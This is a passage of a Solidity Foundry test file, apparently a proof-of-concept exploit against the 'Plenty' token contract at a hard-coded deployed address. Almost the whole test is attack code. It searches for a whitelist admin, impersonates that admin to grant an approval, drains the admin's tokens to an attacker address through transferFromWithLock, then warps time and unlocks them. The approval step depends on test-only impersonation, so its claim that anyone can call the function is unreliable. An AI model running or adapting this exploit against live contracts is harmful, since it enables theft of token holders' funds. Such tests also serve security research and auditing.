}

interface Plenty {
    function owner() external view returns (address);
    function addWhitelistAdmin(address account) external;
    function isWhitelistAdmin(address account) external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFromWithLock(address _from, address _to, bytes32 _reason, uint256 _amount, uint256 _time) external returns (bool);
    function unlock(address _of) external returns (uint256);
    function tokensLocked(address _of, bytes32 _reason) external view returns (uint256);
    function getUnlockableTokens(address _of) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = Plenty(TARGET).owner();

        // Label addresses for debugging
        vm.label(owner, 'Contract Owner');
        vm.label(attacker, 'Attacker');

        // Give attacker some ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Try to find a whitelist admin by checking common addresses
        address[] memory candidates = new address[](6);
        candidates[0] = TARGET; // Contract itself
        candidates[1] = address(0x1); // address(1)
        candidates[2] = address(0x2); // address(2) 
        candidates[3] = address(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeSwap Router
        candidates[4] = address(0x000000000000000000000000000000000000dEaD); // dead address
        candidates[5] = address(0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418); // The contract address again

        address whitelistAdmin = address(0);
        for (uint i = 0; i < candidates.length; i++) {
            try Plenty(TARGET).isWhitelistAdmin(candidates[i]) returns (bool isAdmin) {
                if (isAdmin) {
                    whitelistAdmin = candidates[i];
                    console.log('Found whitelist admin:', whitelistAdmin);
                    break;
                }
            } catch {
                continue;
            }
        }

        require(whitelistAdmin != address(0), 'No whitelist admin found');

        // Use a small amount to avoid limits
        uint256 amount = 1000 * 10**18;
        bytes32 reason = keccak256('exploit');

        // First, try to impersonate the whitelist admin to approve the contract
        // In forked test environment, we can impersonate any address
        vm.startPrank(whitelistAdmin);
        Plenty(TARGET).approve(TARGET, amount);
        vm.stopPrank();
        console.log('Approved contract to spend tokens from whitelist admin');

        // Now exploit the vulnerability: anyone can call transferFromWithLock
        // with a whitelist admin as _from
        vm.prank(attacker);
        bool success = Plenty(TARGET).transferFromWithLock(
            whitelistAdmin, // _from (whitelist admin)
            attacker,       // _to (attacker)  
            reason,         // _reason
            amount,         // _amount
            1 hours         // _time
        );

        require(success, 'transferFromWithLock failed');
        console.log('Tokens locked for attacker');

        // Check tokens are locked
        uint256 locked = Plenty(TARGET).tokensLocked(attacker, reason);
        require(locked == amount, 'Tokens should be locked');

        // Warp time to pass lock period
        vm.warp(block.timestamp + 2 hours);

        // Unlock tokens
        vm.prank(attacker);
        uint256 unlocked = Plenty(TARGET).unlock(attacker);
        console.log('Unlocked tokens:', unlocked);
        require(unlocked > 0, 'Should have unlocked tokens');

        // Verify attacker balance increased
        // Try to get balance, but be careful of potential division by zero
        try Plenty(TARGET).balanceOf(attacker) returns (uint256 attackerBalance) {
            console.log('Attacker final balance:', attackerBalance);
            require(attackerBalance >= unlocked, 'Balance should increase');
        } catch {
            // If balanceOf fails, at least we unlocked tokens
            console.log('balanceOf failed, but unlock succeeded');
        }
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
